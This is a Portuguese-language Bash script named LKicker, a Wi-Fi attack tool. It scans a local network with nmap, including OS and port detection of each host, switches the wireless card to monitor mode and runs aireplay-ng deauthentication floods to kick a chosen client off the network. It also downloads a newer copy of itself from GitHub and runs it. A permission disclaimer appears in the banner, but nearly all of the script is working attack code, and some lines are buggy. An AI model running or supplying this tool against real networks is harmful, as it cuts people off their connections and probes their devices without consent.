#!/bin/bash
# =============[ VARIAVEIS ]=============
	version=3.0.6
	last_date="04/07/19"
	color_red="\033[01;31m"
	color_green="\033[01;32m"
	color_yellow="\033[01;33m"
	color_white="\033[01;37m"
	card_name="wlan0"
# =============[ VARIAVEIS ]============= 
function print_logo(){
        echo -e "\033[01;32m"       
        echo "
 ____             ____   ____     _     _  ___      _             
|  _ \  _____   _|  _ \ / ___|   | |   | |/ (_) ___| | _____ _ __ 
| | | |/ _ \ \ / / |_) | |  _    | |   | ' /| |/ __| |/ / _ \ '__|
| |_| |  __/\ V /|  __/| |_| |   | |___| . \| | (__|   <  __/ |   
|____/ \___| \_/ |_|    \____|___|_____|_|\_\_|\___|_|\_\___|_|   
                            |_____|

        "
	echo " ==============================[ KICKER ]=============================="
    echo "     - Utilize apenas para fins diplomaticos !"
	echo "     - 'Com grandes poderes vem grandes responsabilidades!' - Stan Lee"
	echo "     - Script desenvolvido por: DevPG"
	echo "     - Instagram: @pgdogas"
	echo "     - Versão do script: $version"
	echo "     - Finalidade objetiva: Expulsar intrusos com permissão do responsavel pela rede"
	echo "obs: Certifique-se que voce tem permissão para executar esta ferramenta"
	echo " ==============================[ KICKER ]=============================="
	 echo -e "\033[01;35m"
}
function new_logo(){
	clear
	print_logo
}
function check_version(){
	if [ -e "version" ] ; then rm version > dumps.txt; fi
	wget -q -t 5 https://raw.githubusercontent.com/DevPGT/LKicker/master/version
	network=0
	if [ -e "version" ] ; then
		network=1;
	else
		echo -e "$color_red [!!] Erro ao verificar versionamento ! Voce está conectado a internet ?"
		return
	fi
	version_now=$(cat version | grep "." | sed 's/ //g' | sed  "s/\.//g")
	if [[ $(echo $version | sed 's/\.//g') != $version_now && $network == 1 ]]
		then
			new_logo
			echo -e " $color_red [!!!] $color_yellow Está versão do script está desatualizada ! { $version } Atualize para nova versão:$color_green { $version_now }"
			echo " [!] Proseguir com instalação automatica ? ( s/n )"
			read resposta
			if [ $resposta == "s" ]
				then
					if [ -e "updater" ] ; then rm updater > dumps.txt; fi
					echo -e "
					ping -c 2 127.0.0.1 > dumps.txt
					mv ./lkicker ./kicker_old
					wget https://raw.githubusercontent.com/DevPGT/LKicker/master/lkicker
					chmod +x ./lkicker
					./lkicker
					" > updater
					chmod +x ./updater
					gnome-terminal -- "./updater" > dumps.txt
					stop
			fi

		else
			if [ network == 1 ] ; then echo -e " $color_green[!!] $color_white Script na ultima versão!$color_green { $version }"; fi
	fi
}
function recheck_dependencies(){
	echo -e "$color_yellow [...] Realizando ultimas verificações de dependencias"
	if [[ $(nmap | grep -c "not found") -gt 0 || $(aircrack-ng | grep -c "not found") -gt 0 ]]
		then
			new_logo
			echo -e "$color_red [!] Não é possivel seguir com o script uma de suas dependencias não estão instaladas!(cut , cat , sed , grep , nmap , aircrack-ng)"
			exit
	fi
	echo -e "$color_green [!] Todas as dependencias estão instaladas !"
}
function check_dependencies(){
	echo -e "$color_yellow [...] Realizando verificação de dependencias"
	apt-get install grep sed > core-depends.logs
	if [ $(nmap -version | grep "Nmap version" | sed 's/Nmap.*on //g' | sed 's/ (.*)//g' | sed 's/ //g' | cut -c1) -lt 6 ]
		then
			echo -e "$color_yellow [?] A sua versão do nmap esta desatualizada deseja atualiza-la ?(s/n)"
			read resposta
			if [ $resposta == "s" ]
				then
					echo -e "$color_yellow [!] AGUARDE ! INSTALANDO FERRAMENTA NMAP !"
					apt-get install nmap -fy > nmap_installer.logs
			fi
			echo -e "$color_red [!] Continuando o script com a versão desatualizada do nmap!"
	else
		echo -e "$color_green [!] Nmap version: $(nmap -version | grep "Nmap version" | sed 's/Nmap.*on //g' | sed 's/ (.*)//g')"
	fi

	if [ $(aircrack-ng | grep "Aircrack" | sed 's/  Ai.*g //g' | cut -c1-5 | sed 's/ //g' | cut -c1) -lt 1 ]
		then
			echo -e "$color_red [?] A sua versão do aircrack-ng esta desatualizada deseja atualiza-la ?(S/N)"
			read resposta
			resposta={$resposta,,}
			if [ $resposta == "s" ]
				then
				echo -e "$color_yellow [!] AGUARDE ! INSTALANDO FERRAMENTA AIRCRACK !"
				apt-get install aircrack-ng -fy > aircrack_installer.logs
			fi
			echo -e "$color_red [!] Continuando o script com a versão desatualizada do nmap!"
	else
		echo -e "$color_green [!] Aircrack version: $(aircrack-ng | grep "Aircrack" | sed 's/  Ai.*g //g' | cut -c1-5)"
	fi
	recheck_dependencies
}
function get_routermac(){
	echo -e "$color_yellow [...] Obtendo mac do roteador"
	router_mac=$(iwconfig $card_name| grep Access | sed -e 's/Mode.*nt://g' | grep : | sed -e 's/ //g')
	echo -e "$color_green [!] GATEWAY MAC:$color_white { $router_mac }"
}
function load_clients(){
	echo -e "$color_yellow [...] Pesquisando clientes na rede $lip"
	nmap -sP $lip > scan_out.txt
	grep "MAC" scan_out.txt > clients.txt
	grep "Nmap scan report for" scan_out.txt | sed 's/Nmap.*for //' > clients_ips.txt
	#cut -c13-99 clients.txt
	cut -c14-30 clients.txt > readmacs.txt
}
function frequency_checker(){
	echo -e "$color_yellow [...] Checando Frequencia da conexão"
	hz=$(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1)
	if [ -z $hz ]
			then
				new_logo
				echo -e "\n\n\n\n"
				echo -e "$color_red [!] Não foi identificado nenhuma conexão a internet na sua placa escolhida !"
				echo -e " [!] Reinicie o script e verifique se voce esta conectado a rede com a placa escolhida !"
				exit
	else
		if [ $hz == "5" ]
			then
				echo -e "$color_red [!] ALERTA: FREQUENCIAS MAIORES QUE 2.5GHz PODEM NÃO FUNCIONAR CORRETAMENTE!"
		else
				echo -e "$color_green [!] Frequencia detectada: $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1-8)"
		fi
	fi
	check_internet
}
function know_interfaces(){
	echo -e "$color_yellow [...] Realizando reconhecimento de interfaces e compatibilidades"
	for line in $(cat interfaces.txt)
	do
		if [ $card_name != $line ]
		then
			ifconfig $line down
			echo -e "$color_green [!] Desabilitando interface $line para evitar conflitos!"
			echo $line > up_interfaces.txt
		fi
	done
	frequency_checker
}
function check_internet(){
	echo -e "$color_yellow [...] Checando conexão a internet"
	ping 8.8.8.8 -c 4 > /dev/null;
	if [ "$?" = "0" ]
		then
			echo -e "$color_green [!] Conexão com a internet identificada!"
	else
		echo -e "$color_red [!] Conexão com a internet não identificada ! voce pode experienciar problemas !"
	fi
}
function get_gateway(){
	lip=$(ifconfig $card_name | grep "inet 192" | sed 's/inet.*broadcast/->/' | sed -e 's/ //g' | cut -c3-12 | sed 's/$/0-24/' | sed -r -e 's/[-]+/\//g')
	echo -e "$color_yellow [...] Utilizando metodo 1 para obter o gateway padrão {$lip}"
	if [ $(echo $lip | grep -c ".") -lt 1 ]
		then
		echo -e "$color_yellow [...] Utilizando metodo 2 para obter o gateway padrão {$lip}"
		lip=$(route -n | grep $card_name | cut -c1-9 | grep 2)
		if [ $(echo $lip | grep -c ".") -lt 1 ]
			then
			echo -e "$color_yellow [...] Utilizando metodo 3 para obter o gateway padrão {$lip}"
				lip=$(route -n | grep $card_name | cut -c1-9 | grep 1)
				if [ $(echo $lip | grep -c ".") -lt 1 ]
					then
						echo -e "$color_yellow [...] Utilizando metodo 4 para obter o gateway padrão {$lip}"
						lip=$(ifconfig $card_name | grep "inet 192" | sed 's/inet.*broadcast/->/' | sed -e 's/ //g' | cut -c3-12 | sed 's/$/0-24/' | sed -r -e 's/[-]+/\//g') 
					if [ $(echo $lip | grep -c ".") -lt 1 ]
						then
							echo -e "$color_yellow [?] Não foi possivel identificar seu Gateway Padrao ! Informe seu gateway abaixo (default: 192.168.0.1)"
							read r_mac
							lip="$(echo $r_mac | cut -c1-9).0/24"
					fi
				fi
		fi
	fi	
	echo -e "$color_green [!] GATEWAY PADRÃO: $lip"
}
function show_macs(){
	macs=("1" "0")
	addres_description=("Desconhecido","Desconhecido")
	RES_ADDRES=("-","-")
	failx=0
	x=0
	addr_count=0
	desc_count=0
	for line in $(cat clients_ips.txt)
	do
		RES_ADDRES[$addr_count]="$line"
		let "addr_count = addr_count + 1"
	done
	for line in $(cat clients.txt | sed 's/MA.* (//g' | sed 's/ .*)//g' | sed 's/)//g')
	do
		addres_description[desc_count]="$line"
		let "desc_count = desc_count +1"
	done
	echo -e "$color_green [!]$color_yellow Nome da placa: $color_white $card_name $color_yellow, Frequencia:$color_green $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1-8)$color_yellow Endereço MAC:$color_white $router_mac"
	for line in $(cat readmacs.txt) 
	do 
		macs[$x]="$line"
		address_now=${RES_ADDRES[$x]}
		description=${addres_description[$x]}
		echo -e " \033[01;37m[\033[01;33m $x\033[01;37m ] - $line \033[01;33mENDERECO_IP: -> \033[01;32m[ $address_now ]\033[01;35m - $description" 
		let "x = x + 1"
	done
	if [ $(grep -c "." clients_ips.txt) -lt 2 ]
		then
			if [ $(grep -c "$card_name" up_interfaces.txt) -lt 1 ]
				then
					card_name=$(cat interfaces.txt | grep -n 1 | cut -c3-7)
					echo -e "$color_green [!] Forçando alteração de Interface para  $card_name !"
					get_gateway
					ifconfig $card_name up
					ping 127.0.0.1 -c 4 > dumps.txt
					get_routermac
				    ping 127.0.0.1 -c 4 > dumps.txt
					new_logo
					load_clients
					ping 127.0.0.1 -c 4 > dumps.txt
					show_macs
			fi
		
			
	else
		echo -e "$color_green\n [!] -> Clientes carregados com sucesso!"
	fi
}
function get_nmap(){
	for line in $(cat clients_ips.txt) 
	do
		ip_to=$line
		echo -e "$color_red========= [$color_yellow Endereço em analise:$color_green $ip_to $color_red] =========\n$color_white"
		nmap -O -Pn $ip_to > scan_out.txt
		cat scan_out.txt | grep "Device"
		cat scan_out.txt | grep "Running"
		cat scan_out.txt | grep "OS " | sed 's/OS det.* .//g' | sed 's/(If.* ).//g'
		cat scan_out.txt | grep "open"
	done
	ask
}
function stop(){
	for line in $(cat up_interfaces.txt) 
	do
		ifconfig $line up
	done 
	airmon-ng stop "$card_name"mon > dumps.txt
	clear
	print_logo
	echo -e "$color_red [!] $color_white Obrigado por usar ! espero que tenha gostado !
  se voce experienciou qualquer tipo de problema, porfavor reporte em https://github.com/DevPGT/lkicker"
	echo -e "$color_yellow [!] Desenvolvido por:$color_white Gabriel TX (DevPG)"
	echo -e "$color_green [!] Instagram:$color_white pgdogas"
	echo -e "$color_white [!] Versão:$color_green $version"
	ping 127.0.0.1 -c 5 > dumps.txt
	clear	
	rm readmacs.txt interfaces.txt up_interfaces.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs > dumps.txt
	if [ -e "execute.sh" ] ; then rm execute.sh > dumps.txt; fi
	rm dumps.txt
	exit
}
iwconfig | grep "ESSID" | sed 's/IE.*"//g' | sed 's/ //g' | cut -c1-5 > interfaces.txt
new_logo
setterm -foreground red
echo -e "  [!]   Este script foi criado e testado em sistema baseado em$color_white Debian${color_red}, não há testes realizados em outros sistemas !"
echo -e "  [!]   Dependencias:$color_white nmap, aircrack-ng."
echo -e "$color_red  [!!]  Ainda não há testes de compatibilidade com placas de$color_yellow 5GHz!"
echo -e "$color_yellow  [...] $color_white Verificando se há atualizações para o script"
check_version
echo -e "\n\n"
check_dependencies
echo -e "\033[01;33m [?] -> Qual placa wireless usar ?(default: wlan0 / wlan0mon)"
read card
if [ $card != "" ]
	then
		card_name=$card
		echo -e "$color_green [!] -> O nome da placa sera utilizado como: $card / ${card}mon"
		if [ $(ifconfig $card | grep -c "Device not found") == 1 ]
			then
				echo -e "$color_yellow [!] A Interface $card não existe, foi substituida pela interface padrão ! (wlan0)"
				card_name="wlan0"
		fi 
	else
		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card_name / ${card_name}mon" 
fi
know_interfaces
echo -e "$color_yellow [...] -> Analisando REDE Aguarde!"
get_gateway
load_clients
echo -e "$color_yellow [...] -> Inicializando Kicker..."
ping 127.0.0.1 -c 4 > dumps.txt 
get_routermac
airmon-ng stop wlan0mon > dumps.txt
airmon-ng stop wlan1mon > dumps.txt
new_logo
show_macs
y=$(($x-1))
function ask(){
	echo -e "
$color_yellow  98)$color_white Analisar todos
$color_yellow  97)$color_white Analisar Especifico 
$color_yellow  96)$color_white Scanear rede novamente\n 
$color_red  99) Sair\n
$color_green   0~$y)$color_white Expulsar cliente escolhido"
	setterm -foreground white
	read ddos
	if [ $ddos == 96 ]
		then
			airmon-ng stop ${card_name}mon
			new_logo
			echo -e "$color_yellow [...] Aguarde ajustando parametros e executando funções!"
			ping -c 8 127.0.0.1 > dumps.txt
			get_routermac
			ping -c 2 127.0.0.1 > dumps.txt
			load_clients
			show_macs
			ask
	fi 
	if [ $ddos == 99 ]
		then
			stop
	fi
	if [ $ddos == 98 ]
		then
			get_nmap
	else 
		if [ $ddos == 97 ]
		then
			echo -e "$color_yellow [?] -> Qual Endereço voce quer analisar ? [0 ~ $x]"
			read lets_get
			if [ $lets_get -lt $x ]
				then
					ip_to=${RES_ADDRES[$lets_get]}
					echo -e "$color_red========= [$color_yellow Endereço em analise:$color_green $ip_to $color_red] =========\n$color_white"
					nmap -O -Pn $ip_to > scan_out.txt
					cat scan_out.txt | grep "Device"
					cat scan_out.txt | grep "Running"
					cat scan_out.txt | grep "OS " | sed 's/OS det.* .//g' | sed 's/(If.* ).//g'
					cat scan_out.txt | grep "open"
			fi
			ask
		fi
		mac="${macs[$ddos]}"
		if [ $mac == ""]
		then
			new_logo
			show_macs
			echo -e "\033[01;31m [!] -> Escolha um valor valido!"
			ask
		else
			echo -e "$color_green [!] -> Executando ataque contra ID: $color_red $ddos $color_yellow-> ( $mac )"
			if [ $($router_mac | grep -c ":") == 0 ]
				then
					echo -e "$color_yellow [...] -> Tentando obter mac do roteador !"
					get_routermac
			fi
			new_logo
			echo -e "$color_green [!] -> Executando$color_red ataque$color_green contra ID:$color_red $ddos $color_yellow-> ( $mac )"
			echo -e "$color_green [!] -> GATEWAY_MAC :$color_white $router_mac"
			airmon-ng start $card_name > dumps.txt
			echo -e "$color_green [!] -> HABILITADO MODO MONITORAMENTO PARA$color_white $card_name !"
			setterm -foreground red
			echo -e " [...] -> Iniciando o ataque..."
			ping 127.0.0.1 -c 3 > dumps.txt
			echo -e " [!] -> Para parar o ataque pressione CTRL-C!"
			echo -e ""
			ping -c 3 127.0.0.1 > dumps.txt
			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac "$card_name"mon" >> execute.sh
			chmod +x execute.sh > dumps.txt
			gnome-terminal -- "./execute.sh" > dumps.txt
			show_macs
			ask
		fi
	fi
}
ask

